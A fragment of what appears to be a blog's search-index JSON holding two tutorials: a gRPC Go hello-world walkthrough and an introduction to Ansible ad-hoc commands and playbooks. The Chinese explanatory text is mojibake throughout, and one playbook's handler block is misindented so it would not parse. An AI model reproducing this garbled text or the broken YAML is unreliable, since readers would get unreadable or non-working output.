0x00, 0x00, 0x00,\n}\n\n// Reference imports to suppress errors if they are not otherwise used.\nvar _ context.Context\nvar _ grpc.ClientConn\n\n// This is a compile-time assertion to ensure that this generated file\n// is compatible with the grpc package it is being compiled against.\nconst _ = grpc.SupportPackageIsVersion4\n\n// GreeterClient is the client API for Greeter service.\n//\n// For semantics around ctx use and closing/ending streaming RPCs, please refer to https://godoc.org/google.golang.org/grpc#ClientConn.NewStream.\ntype GreeterClient interface {\n\t// Sends a greeting\n\tSayHello(ctx context.Context, in *HelloRequest, opts ...grpc.CallOption) (*HelloReply, error)\n}\n\ntype greeterClient struct {\n\tcc *grpc.ClientConn\n}\n\nfunc NewGreeterClient(cc *grpc.ClientConn) GreeterClient {\n\treturn &greeterClient{cc}\n}\n\nfunc (c *greeterClient) SayHello(ctx context.Context, in *HelloRequest, opts ...grpc.CallOption) (*HelloReply, error) {\n\tout := new(HelloReply)\n\terr := c.cc.Invoke(ctx, \"/helloworld.Greeter/SayHello\", in, out, opts...)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\treturn out, nil\n}\n\n// GreeterServer is the server API for Greeter service.\ntype GreeterServer interface {\n\t// Sends a greeting\n\tSayHello(context.Context, *HelloRequest) (*HelloReply, error)\n}\n\n// UnimplementedGreeterServer can be embedded to have forward compatible implementations.\ntype UnimplementedGreeterServer struct {\n}\n\nfunc (*UnimplementedGreeterServer) SayHello(ctx context.Context, req *HelloRequest) (*HelloReply, error) {\n\treturn nil, status.Errorf(codes.Unimplemented, \"method SayHello not implemented\")\n}\n\nfunc RegisterGreeterServer(s *grpc.Server, srv GreeterServer) {\n\ts.RegisterService(&_Greeter_serviceDesc, srv)\n}\n\nfunc _Greeter_SayHello_Handler(srv interface{}, ctx context.Context, dec func(interface{}) error, interceptor grpc.UnaryServerInterceptor) (interface{}, error) {\n\tin := new(HelloRequest)\n\tif err := dec(in); err != nil {\n\t\treturn nil, err\n\t}\n\tif interceptor == nil {\n\t\treturn srv.(GreeterServer).SayHello(ctx, in)\n\t}\n\tinfo := &grpc.UnaryServerInfo{\n\t\tServer:     srv,\n\t\tFullMethod: \"/helloworld.Greeter/SayHello\",\n\t}\n\thandler := func(ctx context.Context, req interface{}) (interface{}, error) {\n\t\treturn srv.(GreeterServer).SayHello(ctx, req.(*HelloRequest))\n\t}\n\treturn interceptor(ctx, in, info, handler)\n}\n\nvar _Greeter_serviceDesc = grpc.ServiceDesc{\n\tServiceName: \"helloworld.Greeter\",\n\tHandlerType: (*GreeterServer)(nil),\n\tMethods: []grpc.MethodDesc{\n\t\t{\n\t\t\tMethodName: \"SayHello\",\n\t\t\tHandler:    _Greeter_SayHello_Handler,\n\t\t},\n\t},\n\tStreams:  []grpc.StreamDesc{},\n\tMetadata: \"helloworld.proto\",\n}\n\n```\n\n\n\næˆ‘ä»¬çœ‹ä¸‹`greeter_server` çš„ä»£ç å¹¶ä¸”å¯åŠ¨: `go run greeter_server/main.go`\n\n```go\npackage main\n\nimport (\n\t\"context\"\n\t\"log\"\n\t\"net\"\n\n\t\"google.golang.org/grpc\"\n\tpb \"google.golang.org/grpc/examples/helloworld/helloworld\"\n)\n\nconst (\n\tport = \":50051\"\n)\n\n// server is used to implement helloworld.GreeterServer.\ntype server struct{}\n\n// SayHello implements helloworld.GreeterServer\nfunc (s *server) SayHello(ctx context.Context, in *pb.HelloRequest) (*pb.HelloReply, error) {\n\tlog.Printf(\"Received: %v\", in.Name)\n\treturn &pb.HelloReply{Message: \"Hello \" + in.Name}, nil\n}\n\nfunc main() {\n\tlis, err := net.Listen(\"tcp\", port)\n\tif err != nil {\n\t\tlog.Fatalf(\"failed to listen: %v\", err)\n\t}\n\ts := grpc.NewServer()\n\tpb.RegisterGreeterServer(s, &server{})\n\tif err := s.Serve(lis); err != nil {\n\t\tlog.Fatalf(\"failed to serve: %v\", err)\n\t}\n}\n```\n\n\n\næˆ‘ä»¬çœ‹ä¸‹`greeter_client`çš„ä»£ç å¹¶ä¸”å¯åŠ¨:` go run greeter_client/main.go`\n\n\n\n```go\npackage main\n\nimport (\n\t\"context\"\n\t\"log\"\n\t\"os\"\n\t\"time\"\n\n\t\"google.golang.org/grpc\"\n\tpb \"google.golang.org/grpc/examples/helloworld/helloworld\"\n)\n\nconst (\n\taddress     = \"localhost:50051\"\n\tdefaultName = \"world\"\n)\n\nfunc main() {\n\t// Set up a connection to the server.\n\tconn, err := grpc.Dial(address, grpc.WithInsecure())\n\tif err != nil {\n\t\tlog.Fatalf(\"did not connect: %v\", err)\n\t}\n\tdefer conn.Close()\n\tc := pb.NewGreeterClient(conn)\n\n\t// Contact the server and print out its response.\n\tname := defaultName\n\tif len(os.Args) > 1 {\n\t\tname = os.Args[1]\n\t}\n\tctx, cancel := context.WithTimeout(context.Background(), time.Second)\n\tdefer cancel()\n\tr, err := c.SayHello(ctx, &pb.HelloRequest{Name: name})\n\tif err != nil {\n\t\tlog.Fatalf(\"could not greet: %v\", err)\n\t}\n\tlog.Printf(\"Greeting: %s\", r.Message)\n}\n```\n\n\n\nIf things go smoothly, you will see the `Greeting: Hello world` in the client side output.\n\nCongratulations! Youâ€™ve just run a client-server application with gRPC.\n\n\n\n##### 2.1 ä¿®æ”¹protoæ­¥éª¤æ€»ç»“\n\n+ åœ¨protoæ–‡ä»¶é‡Œå¢åŠ  `rpc SayHelloAgain (HelloRequest) returns (HelloReply) {}`çš„å®šä¹‰\n\n+ é€šè¿‡protocé‡æ–°ç”Ÿæˆgolangæ–‡ä»¶, é‡Œé¢å¢åŠ äº†SayHelloAgainç›¸å…³æ–¹æ³•\n\n+ ä¿®æ”¹serveræ–‡ä»¶å¢åŠ æ–¹æ³•æ¥å®ç°æ¥å£\n\n  ```go\n  func (s *server) SayHelloAgain(ctx context.Context, in *pb.HelloRequest) (*pb.HelloReply, error) {\n          return &pb.HelloReply{Message: \"Hello again \" + in.Name}, nil\n  }\n  ```\n\n+ ä¿®æ”¹clientæ–¹æ³•å¢åŠ è°ƒç”¨\n\n  ```go\n  r, err = c.SayHelloAgain(ctx, &pb.HelloRequest{Name: name})\n  if err != nil {\n          log.Fatalf(\"could not greet: %v\", err)\n  }\n  log.Printf(\"Greeting: %s\", r.Message)\n  ```\n\n+ æ€»ç»“\n  \n  + clientè°ƒç”¨çš„çš„`SayHelloAgain`æ˜¯`helloworld.pb.go`é‡Œç”Ÿæˆçš„æ–¹æ³•\n  + serverå¢åŠ çš„æ–¹æ³•æ˜¯ä¸ºäº†å®ç°äº†`helloworld.pb.go` ç”Ÿæˆçš„serveræ–°æ¥å£, æ¥å®ç°callback\n\n\n\n### 3. TODO: cpp ç‰ˆæœ¬\n\nå‚è€ƒ: https://github.com/grpc/grpc/blob/master/BUILDING.md\n\n```bash\n# å®‰è£…xcode command line tools\nsudo xcode-select --install\n# å…ˆå®‰è£…å¿…å¤‡çš„è½¯ä»¶\nbrew install autoconf automake libtool shtool gflags\n\n# ä¸‹è½½å®˜æ–¹ä»£ç å¹¶æ›´æ–°ä¾èµ–\ngit clone https://github.com/grpc/grpc\ngit submodule update --init\n\n# ç¼–è¯‘å¹¶ä¸”å®‰è£…\nLIBTOOL=glibtool LIBTOOLIZE=glibtoolize make\nsudo make install\n```\n\n\n\næˆ‘ä»¬å…ˆè¿›å…¥hellworldä¾‹å­\n\n```bash\ncd examples/cpp/hellworld/\nmake\n\n# makeè¿‡ç¨‹ä¸­å¯ä»¥çœ‹åˆ°ä¼šå…ˆç”Ÿæˆhelloworld.pb.cc\nprotoc -I ../../protos --cpp_out=. ../../protos/helloworld.proto\n```\n\n\n\nè¿˜å¯ä»¥è¿™æ ·ç”Ÿæˆ:\n\n```bash\nprotoc --cpp_out=. helloworld.proto\nprotoc --grpc_out=. --plugin=protoc-gen-grpc=`which grpc_cpp_plugin` helloworld.proto\n```\n\n\n\n### 4. TODO: pythonç‰ˆæœ¬\n\n```bash\nsudo python3 -m pip install grpcio\nsudo python3 -m pip install grpcio-tools\npython3 -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. helloworld.proto\n```\n\n\n\n\n\n### 5. å‚è€ƒèµ„æ–™:\n\n- https://grpc.io/docs/quickstart/","tags":["grpc"],"categories":["golang"]},{"title":"ansibleå®è·µ","url":"%2Fp%2F18605da6.html","content":"\n\n\n### 1. ansible å®‰è£…\n\nåœ¨ ansible çš„ä¸–ç•Œé‡Œï¼Œæˆ‘ä»¬ä¼šé€šè¿‡ inventory æ¡£æ¡ˆæ¥å®šä¹‰æœ‰å“ªäº› managed node (è¢«æ§ç«¯)ï¼Œå¹¶å€Ÿç”± ssh å’Œ python è¿›è¡Œæ²Ÿé€šã€‚æ¢å¥è¯è¯´ï¼Œå½“ control machine (ä¸»æ§ç«¯) å¯ä»¥ç”¨ ssh è¿ä¸Š managed nodeï¼Œä¸”è¢«è¿ä¸Šçš„æœºå™¨é‡Œæœ‰é¢„è½½ python æ—¶ï¼Œansile å°±å¯ä»¥è¿ä½œäº†.\n\n+ æ§åˆ¶ç«¯\n\n```bash\nsudo apt install ansible #linux\nbrew install ansible # mac\n```\n\n+ è¢«æ§ç«¯\n\n  è¦å®‰è£… python, å¹¶ä¸”èƒ½è¢«æ§åˆ¶ç«¯ ssh \n\n<!-- more -->\n\n### 2. ansible é…ç½®\n\nansibleçš„é»˜è®¤é…ç½®æ–‡ä»¶è·¯å¾„ä¸º /etc/ansibleï¼Œç„¶è€Œï¼Œä¸€ä¸ªå¸¸è§çš„ç”¨é€”æ˜¯å°†å…¶å®‰è£…åœ¨ä¸€ä¸ªvirtualenvä¸­ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¸€èˆ¬ä¸ä¼šä½¿ç”¨è¿™äº›é»˜è®¤æ–‡ä»¶ã€‚æˆ‘ä»¬å¯ä»¥æ ¹æ®éœ€è¦åœ¨æœ¬åœ°ç›®å½•ä¸­åˆ›å»ºé…ç½®æ–‡ä»¶ã€‚\n\n##### 2.1 inventoryæ–‡ä»¶\n\næ‚¨å¯ä»¥åˆ›å»ºä¸€ä¸ªinventoryæ–‡ä»¶ï¼Œç”¨äºå®šä¹‰å°†è¦ç®¡ç†çš„æœåŠ¡å™¨ã€‚è¿™ä¸ªæ–‡ä»¶å¯ä»¥å‘½åä¸ºä»»ä½•åå­—ï¼Œä½†æˆ‘ä»¬é€šå¸¸ä¼šå‘½åä¸ºhostsæˆ–è€…é¡¹ç›®çš„åç§°ã€‚ \n\nåœ¨hostsæ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å®šä¹‰ä¸€äº›è¦ç®¡ç†çš„æœåŠ¡å™¨ã€‚è¿™é‡Œæˆ‘ä»¬å°†å®šä¹‰æˆ‘ä»¬å¯èƒ½è¦åœ¨â€œwebâ€æ ‡ç­¾ä¸‹ç®¡ç†çš„ä¸¤ä¸ªæœåŠ¡å™¨ã€‚æ ‡ç­¾æ˜¯ä»»æ„çš„ã€‚\n\n```bash\n[web]\n192.168.22.10\n192.168.22.11\n```\n\nç°åœ¨ï¼Œè®©æˆ‘ä»¬å°†hostsæ–‡ä»¶è®¾ç½®ä¸ºæŒ‡å‘æœ¬åœ°ä¸»æœºlocalå’Œremoteè™šæ‹Ÿè¿œç¨‹ä¸»æœºã€‚ \n\n```bash\n[local]\n127.0.0.1\n\n[remote]\n192.168.1.2\n```\n\n### 3. ansible ä½¿ç”¨\n\næˆ‘ä»¬å¼€å§‹å¯¹æœåŠ¡å™¨è¿è¡Œä»»åŠ¡ã€‚ansibleä¼šå‡å®šä½ çš„æœåŠ¡å™¨å…·æœ‰sshè®¿é—®æƒé™ï¼Œé€šå¸¸åŸºäºssh-keyã€‚å› ä¸ºansibleä½¿ç”¨sshï¼Œæ‰€ä»¥å®ƒéœ€è¦èƒ½å¤Ÿsshè¿æ¥åˆ°æœåŠ¡å™¨ã€‚ä½†æ˜¯ï¼Œansibleå°†å°è¯•ä»¥æ­£åœ¨è¿è¡Œçš„å½“å‰ç”¨æˆ·èº«ä»½è¿›è¡Œè¿æ¥ã€‚å¦‚æœæˆ‘æ­£åœ¨è¿è¡Œansibleçš„ç”¨æˆ·æ˜¯ubuntuï¼Œå®ƒå°†å°è¯•ä»¥ubuntuè¿æ¥å…¶ä»–æœåŠ¡å™¨ã€‚\n\nNote: æ§åˆ¶ç«¯å’Œè¢«æ§ç«¯çš„ç”¨æˆ·å¾ˆæ˜¾ç„¶ä¼šä¸ä¸€æ ·ã€‚\n\n```bash\nwhoami # levonfly\n\nansible -i ./hosts --connection=local local -m ping\n127.0.0.1 | SUCCESS => {\n    \"changed\": false,\n    \"ping\": \"pong\"\n}\n\n\nansible -i ./hosts remote -m ping\n192.168.1.2 | UNREACHABLE! => {\n    \"changed\": false,\n    \"msg\": \"Failed to connect to the host via ssh: ssh: connect to host 192.168.1.2 port 22: Operation timed out\\r\\n\",\n    \"unreachable\": true\n}\n```\n\n\n\n+ ä½¿ç”¨â€“connection=localå‘Šè¯‰ansibleä¸å°è¯•é€šè¿‡sshè¿è¡Œå‘½ä»¤ï¼Œå› ä¸ºæˆ‘ä»¬åªæ˜¯å½±å“æœ¬åœ°ä¸»æœºã€‚ä½†æ˜¯ï¼Œæˆ‘ä»¬ä»ç„¶éœ€è¦ä¸€ä¸ªhostsæ–‡ä»¶ï¼Œå‘Šè¯‰æˆ‘ä»¬è¿æ¥åˆ°å“ªé‡Œã€‚ \n\n+ åœ¨ä»»ä½•æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä»ansibleå¾—åˆ°çš„è¾“å‡ºæ˜¯ä¸€äº›jsonï¼Œå®ƒå‘Šè¯‰æˆ‘ä»¬taskï¼ˆæˆ‘ä»¬å¯¹pingæ¨¡å—çš„è°ƒç”¨ï¼‰æ˜¯å¦è¿›è¡Œäº†ä»»ä½•æ›´æ”¹å’Œç»“æœã€‚\n\n\n\nå‘½ä»¤è¯´æ˜ï¼š\n\n```bash\n-i ./hosts \t\t\t\t# è®¾ç½®åº“å­˜æ–‡ä»¶ï¼Œå‘½åä¸º hosts\nremoteï¼Œlocalï¼Œall # ä½¿ç”¨è¿™ä¸ªæ ‡ç­¾çš„ä¸‹å®šä¹‰çš„æœåŠ¡å™¨hostsæ¸…å•æ–‡ä»¶ã€‚â€œallâ€æ˜¯é’ˆå¯¹æ–‡ä»¶ä¸­å®šä¹‰çš„æ¯ä¸ªæœåŠ¡å™¨è¿è¡Œçš„ç‰¹æ®Šå…³é”®å­—, æ³¨æ„allæ¯”è¾ƒç‰¹æ®Š\n-m ping # ä½¿ç”¨â€œpingâ€æ¨¡å—ï¼Œå®ƒåªæ˜¯è¿è¡Œpingå‘½ä»¤å¹¶è¿”å›ç»“æœ\n-c local| --connection=local # åœ¨æœ¬åœ°æœåŠ¡å™¨ä¸Šè¿è¡Œå‘½ä»¤ï¼Œè€Œä¸æ˜¯SSH\n\nä¸€äº›å¸¸ç”¨å‘½ä»¤ï¼š\n-i PATH --inventory=PATH # æŒ‡å®šhostæ–‡ä»¶çš„è·¯å¾„ï¼Œé»˜è®¤æ˜¯åœ¨/etc/ansible/hosts\n--private-key=PRIVATE_KEY_FILE_PATH # ä½¿ç”¨æŒ‡å®šè·¯å¾„çš„ç§˜é’¥å»ºç«‹è®¤è¯è¿æ¥\n-m DIRECTORY --module-path=DIRECTORY #æŒ‡å®šmoduleçš„ç›®å½•æ¥åŠ è½½moduleï¼Œé»˜è®¤æ˜¯/usr/share/ansible\n-c CONNECTION --connection=CONNECTION #æŒ‡å®šå»ºç«‹è¿æ¥çš„ç±»å‹ï¼Œä¸€èˆ¬æœ‰ssh ï¼Œlocal\n```\n\n\n\n##### 3.1 æ¨¡å—ï¼ˆmodulesï¼‰\n\nansibleä½¿ç”¨â€œæ¨¡å—â€æ¥å®Œæˆå¤§éƒ¨åˆ†çš„ä»»åŠ¡ã€‚æ¨¡å—å¯ä»¥åšå®‰è£…è½¯ä»¶ï¼Œå¤åˆ¶æ–‡ä»¶ï¼Œä½¿ç”¨æ¨¡æ¿ç­‰ç­‰ã€‚\n\nå¦‚æœæˆ‘ä»¬æ²¡æœ‰æ¨¡å—ï¼Œæˆ‘ä»¬å°†è¿è¡Œä»»æ„çš„shellå‘½ä»¤ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨bashè„šæœ¬ã€‚è¿™æ˜¯ä¸€ä¸ªä»»æ„shellå‘½ä»¤çœ‹èµ·æ¥åƒåœ¨ansibleï¼ˆå®ƒä½¿ç”¨çš„shellæ¨¡å—ï¼ï¼‰ï¼š\n\n```bash\n# åœ¨æœ¬åœ°æ‰§è¡Œlså‘½ä»¤\nansible -i ./hosts local --connection=local -m shell -a 'ls'\n\n127.0.0.1 | SUCCESS | rc=0 >>\nREADME.md\nhosts\nnginx.yml\nroles\n\n# åœ¨è¿œç¨‹å®‰è£…nginx, æ³¨æ„--become-user=rootæ˜¯æ”¹å˜æ§åˆ¶ç«¯çš„ç”¨æˆ·, ä¸æ˜¯è¢«æ§ç«¯\nansible -i ./hosts remote -b --become-user=root -m shell -a 'yum install nginx'\n172.24.120.46 | UNREACHABLE! => {\n    \"changed\": false,\n    \"msg\": \"Failed to connect to the host via ssh: liuwei@172.24.120.46: Permission denied (publickey,gssapi-keyex,gssapi-with-mic,password).\\r\\n\",\n    \"unreachable\": true\n}\n```\n\nå‘½ä»¤è¯´æ˜:\n\n```bash\n-b # â€œæˆä¸ºâ€ï¼Œåœ¨è¿è¡Œå‘½ä»¤æ—¶å‘Šè¯‰å¯ä»¥æˆä¸ºå¦ä¸€ä¸ªç”¨æˆ·ã€‚\n--become-user=root # ä»¥ç”¨æˆ·â€œrootâ€è¿è¡Œä»¥ä¸‹å‘½ä»¤, æ˜¯æ”¹å˜æ§åˆ¶ç«¯çš„ç”¨æˆ·, ä¸æ˜¯è¢«æ§ç«¯!!!\n\n-a #ç”¨äºå°†ä»»ä½•å‚æ•°ä¼ é€’ç»™-må®šä¹‰çš„æ¨¡å—\n```\n\n\n\nè¦åœ¨centosæœåŠ¡å™¨ä¸Šå®‰è£…è½¯ä»¶ï¼Œâ€œyumâ€æ¨¡å—å°†è¿è¡Œç›¸åŒçš„å‘½ä»¤ï¼Œä½†ç¡®ä¿å¹‚ç­‰ã€‚\n\n```bash\n# æŒ‡å®šrootç”¨æˆ·yumå®‰è£…nginx\nansible -i ./hosts remote -v -m yum -a 'name=nginx state=installed update_cache=true' -u root -k\n\nNo config file found; using defaults\nSSH password: xxx\n172.24.120.46 | SUCCESS => {\n    \"changed\": false,\n    \"msg\": \"\",\n    \"rc\": 0,\n    \"results\": [\n        \"1:nginx-1.12.2-3.el7.x86_64 providing nginx is already installed\"\n    ]\n}\n\n\n# æŒ‡å®šæ™®é€šç”¨æˆ·yumå®‰è£…nginx, å¹¶ä¸”è¾“å…¥sudoå¯†ç \nansible -i ./hosts remote -v -m yum -a 'name=nginx state=installed update_cache=true' -u liuwei -k -s -K \nSSH password: xxx\nSUDO password[defaults to SSH password]: xxx\n172.24.120.46 | SUCCESS => {\n    \"changed\": false,\n    \"msg\": \"\",\n    \"rc\": 0,\n    \"results\": [\n        \"1:nginx-1.12.2-3.el7.x86_64 providing nginx is already installed\"\n    ]\n}\n```\n\nå‘½ä»¤è¯´æ˜:\n\n```bash\n-v   \t # verbose mode, (-vvv for more, -vvvv to enable connection debugging)\n-m apt # ä½¿ç”¨aptæ¨¡å—\n-a 'name=nginx state=installed update_cache=true' # æä¾›aptæ¨¡å—çš„å‚æ•°ï¼ŒåŒ…æ‹¬è½¯ä»¶åŒ…åç§°ï¼Œæ‰€éœ€çš„ç»“æŸçŠ¶æ€ä»¥åŠæ˜¯å¦æ›´æ–°è½¯ä»¶åŒ…å­˜å‚¨åº“ç¼“å­˜\n\nå¸¸ç”¨å‘½ä»¤ï¼š\n-u USERNAME | --user=USERNAME #æŒ‡å®šè¢«æ§ç«¯çš„æ‰§è¡Œç”¨æˆ·\n-k | --ask-pass  #æç¤ºè¾“å…¥sshçš„å¯†ç ï¼Œè€Œä¸æ˜¯ä½¿ç”¨åŸºäºsshçš„å¯†é’¥è®¤è¯\n\n-s | --sudo  #æŒ‡å®šç”¨æˆ·çš„æ—¶å€™ï¼Œä½¿ç”¨sudoè·å¾—rootæƒé™\n-K | --ask-sudo-pass #æç¤ºè¾“å…¥sudoå¯†ç ï¼Œä¸--sudoä¸€èµ·ä½¿ç”¨\n```\n\nè¿™å°†ä½¿ç”¨yumæ¨¡å—æ¥æ›´æ–°å­˜å‚¨åº“ç¼“å­˜å¹¶å®‰è£…nginxï¼ˆå¦‚æœæ²¡æœ‰å®‰è£…ï¼‰ã€‚ è¿è¡Œä»»åŠ¡çš„ç»“æœæ˜¯â€changedâ€: falseã€‚è¿™è¡¨æ˜æ²¡æœ‰å˜åŒ–; æˆ‘å·²ç»ä½¿ç”¨è¯¥shellæ¨¡å—å®‰è£…äº†nginx ã€‚å¥½çš„æ˜¯ï¼Œæˆ‘å¯ä»¥ä¸€éåˆä¸€éåœ°è¿è¡Œè¿™ä¸ªå‘½ä»¤ï¼Œè€Œä¸ç”¨æ‹…å¿ƒå®ƒä¼šæ”¹å˜é¢„æœŸçš„ç»“æœ - nginxå·²ç»å®‰è£…ï¼ŒansibleçŸ¥é“ï¼Œå¹¶ä¸”ä¸å°è¯•é‡æ–°å®‰è£…å®ƒã€‚ \n\n\n\n##### 3.2 å‰§æœ¬ï¼ˆplaybooksï¼‰\n\nplaybookå¯ä»¥è¿è¡Œå¤šä¸ªä»»åŠ¡ï¼Œå¹¶æä¾›ä¸€äº›æ›´é«˜çº§çš„åŠŸèƒ½ã€‚è®©æˆ‘ä»¬å°†ä¸Šè¿°ä»»åŠ¡ç§»åˆ°ä¸€æœ¬å‰§æœ¬ä¸­ã€‚åœ¨ansibleä¸­å‰§æœ¬ï¼ˆplaybooksï¼‰å’Œè§’è‰²ï¼ˆrolesï¼‰éƒ½ä½¿ç”¨yamlæ–‡ä»¶å®šä¹‰ã€‚ \n\nnginx.ymlï¼š(é€šè¿‡yamlå†™æ‰€éœ€å‚æ•°)\n\n```yaml\n- hosts: remote\n  become: yes\n  become_user: root\n  tasks:\n   - name: Install Nginx\n     yum:\n       name: nginx\n       state: installed\n       update_cache: true\n```\n\n\n\nè¿™å°†ä½¿ç”¨inventoryæ–‡ä»¶ä¸­[remote]æ ‡ç­¾ä¸‹çš„æœåŠ¡å™¨hostsã€‚åœ¨æˆ‘ä»¬çš„tasksæ–‡ä»¶ä¸­ä½¿ç”¨becomeå¹¶become_userå†æ¬¡ä½¿ç”¨ansibleæ¥sudoä»¥rootç”¨æˆ·èº«ä»½è¿è¡Œå‘½ä»¤ï¼Œç„¶åä¼ é€’playbookæ–‡ä»¶ã€‚ä½¿ç”¨ä¸€ä¸ªyaml playbookæ–‡ä»¶ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨è¿™ä¸ªansible-playbookå‘½ä»¤ï¼š\n\n\n\n```bash\nansible-playbook -i ./hosts nginx.yml -k -K\nSSH password:\nSUDO password[defaults to SSH password]:\n\nPLAY [remote] ***************************************************************************************************************************************************************************\n\nTASK [Gathering Facts] ******************************************************************************************************************************************************************\nok: [172.24.120.46]\n\nTASK [Install Nginx] ********************************************************************************************************************************************************************\nok: [172.24.120.46]\n\nPLAY RECAP ******************************************************************************************************************************************************************************\n172.24.120.46              : ok=2    changed=0    unreachable=0    failed=0\n```\n\næˆ‘ä»¬åœ¨è¿è¡Œè¿‡ç¨‹ä¸­è·å¾—äº†ä¸€äº›æœ‰ç”¨çš„åé¦ˆï¼ŒåŒ…æ‹¬â€œå¯æ‰§è¡Œä»»åŠ¡â€è¿è¡ŒåŠå…¶ç»“æœã€‚åœ¨è¿™é‡Œæˆ‘ä»¬çœ‹åˆ°æ‰€æœ‰è¿è¡Œéƒ½okï¼Œä½†æ²¡æœ‰æ”¹å˜ã€‚\n\n\n\n##### 3.3 å¤„ç†ç¨‹åºï¼ˆhandlersï¼‰\n\nå¤„ç†ç¨‹åºä¸ä»»åŠ¡å®Œå…¨ç›¸åŒï¼ˆå®ƒå¯ä»¥åštaskå¯ä»¥åšçš„ä»»ä½•äº‹ï¼‰ï¼Œä½†åªæœ‰å½“å¦ä¸€ä¸ªä»»åŠ¡è°ƒç”¨å®ƒæ—¶æ‰ä¼šè¿è¡Œã€‚æ‚¨å¯ä»¥å°†å…¶è§†ä¸ºäº‹ä»¶ç³»ç»Ÿçš„ä¸€éƒ¨åˆ†; å¤„ç†ç¨‹åºå°†é€šè¿‡å…¶ä¾¦å¬çš„äº‹ä»¶è°ƒç”¨è¿›è¡Œæ“ä½œã€‚ è¿™å¯¹äºè¿è¡Œä»»åŠ¡åå¯èƒ½éœ€è¦çš„â€œè¾…åŠ©â€æ“ä½œéå¸¸æœ‰ç”¨ï¼Œä¾‹å¦‚åœ¨é…ç½®æ›´æ”¹åå®‰è£…æˆ–é‡æ–°åŠ è½½æœåŠ¡åå¯åŠ¨æ–°æœåŠ¡ã€‚\n\n```yaml\n- hosts: remote\n  become: yes\n  become_user: root\n  tasks:\n   - name: Install Nginx\n     yum:\n       name: nginx\n       state: installed\n       update_cache: true\n     notify: #å¤åˆ¶çš„æ—¶å€™, è¦æ³¨æ„ç©ºæ ¼, å¯¹é½\n      - Start Nginx\n\n  handlers:\n   - name: Start Nginx\n     service:\n       name: nginx\n       state: started\n```\n\nè¿™é‡Œæˆ‘ä»¬æ·»åŠ ä¸€ä¸ªnotifyæŒ‡ä»¤åˆ°å®‰è£…ä»»åŠ¡ã€‚è¿™å°†åœ¨ä»»åŠ¡è¿è¡Œåé€šçŸ¥åä¸ºâ€œStart Nginxâ€çš„å¤„ç†ç¨‹åºã€‚ç„¶åæˆ‘ä»¬å¯ä»¥åˆ›å»ºåä¸ºâ€œStart Nginxâ€çš„å¤„ç†ç¨‹åºã€‚æ­¤å¤„ç†ç¨‹åºæ˜¯é€šçŸ¥â€œStart Nginxâ€æ—¶è°ƒç”¨çš„ä»»åŠ¡ã€‚ è¿™ä¸ªç‰¹å®šçš„å¤„ç†ç¨‹åºä½¿ç”¨æœåŠ¡æ¨¡å—ï¼Œå®ƒå¯ä»¥å¯åŠ¨ï¼Œåœæ­¢ï¼Œé‡å¯ï¼Œé‡æ–°åŠ è½½ï¼ˆç­‰ç­‰ï¼‰ç³»ç»ŸæœåŠ¡ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å‘Šè¯‰ansibleï¼Œæˆ‘ä»¬è¦å¯åŠ¨Nginxã€‚ \n\n+ å¦‚æœæˆ‘å·²ç»å®‰è£…äº†nginxï¼Œåˆ™å®‰è£…nginxä»»åŠ¡å°†ä¸ä¼šè¿è¡Œï¼Œé€šçŸ¥ç¨‹åºä¹Ÿå°†ä¸ä¼šè¢«è°ƒç”¨ã€‚\n\n\n\n##### 3.4 æ›´å¤šçš„ä»»åŠ¡ï¼ˆmore tasksï¼‰\n\næ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å¯ä»¥ä¸ºæ­¤playbookæ·»åŠ æ›´å¤šçš„ä»»åŠ¡ï¼Œå¹¶æ¢ç´¢å…¶ä»–ä¸€äº›åŠŸèƒ½ã€‚\n\n```yaml\n- hosts: local\n  connection: local\n  become: yes\n  become_user: root\n  vars:\n   - docroot: /var/www/serversforhackers.com/public\n  tasks:\n   - name: Add Nginx Repository\n     apt_repository:\n       repo: ppa:nginx/stable\n       state: present\n     register: ppastable\n\n   - name: Install Nginx\n     apt:\n       pkg: nginx\n       state: installed\n       update_cache: true\n     when: ppastable|success\n     notify:\n      - Start Nginx\n\n   - name: Create Web Root\n     file:\n      path: '{{ docroot }}'\n      mode: 775\n      state: directory\n      owner: www-data\n      group: www-data\n     notify:\n      - Reload Nginx\n\n  handlers:\n   - name: Start Nginx\n     service:\n       name: nginx\n       state: started\n\n    - name: Reload Nginx\n      service:\n        name: nginx\n        state: reloaded\n```\n\nç°åœ¨æœ‰ä¸‰ä¸ªä»»åŠ¡ï¼š\n\n```bash\nAdd Nginx Repository # ä½¿ç”¨apt_repositoryæ¨¡å—æ·»åŠ Nginxç¨³å®šPPAä»¥è·å–æœ€æ–°çš„ç¨³å®šç‰ˆæœ¬çš„Nginx ã€‚\nInstall Nginx \t\t   # ä½¿ç”¨aptæ¨¡å—å®‰è£…Nginxã€‚\nCreate Web Root      # æœ€ååˆ›å»ºä¸€ä¸ªWebæ ¹ç›®å½•ã€‚\n```\n\næ–°çš„registerå’ŒwhenæŒ‡ä»¤ï¼Œå¯ä»¥å®ç°åœ¨æŸäº›äº‹æƒ…å‘ç”Ÿåè®©ansibleæ‰§è¡Œä»»åŠ¡çš„åŠŸèƒ½ã€‚\n\næ‚¨è¿˜å¯ä»¥æ³¨å†Œæ¨¡å—æ“ä½œçš„ç»“æœï¼Œå¹¶ä½¿ç”¨å®šä¹‰çš„å˜é‡æ ¹æ®æ³¨å†Œï¼ˆregisterï¼‰çš„å˜é‡å€¼æœ‰æ¡ä»¶ï¼ˆwhenï¼‰åœ°æ‰§è¡Œæ“ä½œã€‚ä¾‹å¦‚ï¼Œæ³¨å†Œé€šè¿‡shellæ¨¡å—è¿è¡Œå‘½ä»¤çš„ç»“æœå¯ä»¥è®©æ‚¨è®¿é—®è¯¥å‘½ä»¤çš„stdoutã€‚\n\nåŒæ—¶è¿˜ä½¿ç”¨äº†ä¸€ä¸ªå˜é‡, docrootå˜é‡åœ¨å®šä¹‰varséƒ¨åˆ†ã€‚ç„¶åå°†å…¶ç”¨ä½œåˆ›å»ºå®šä¹‰ç›®å½•çš„æ–‡ä»¶æ¨¡å—çš„ç›®æ 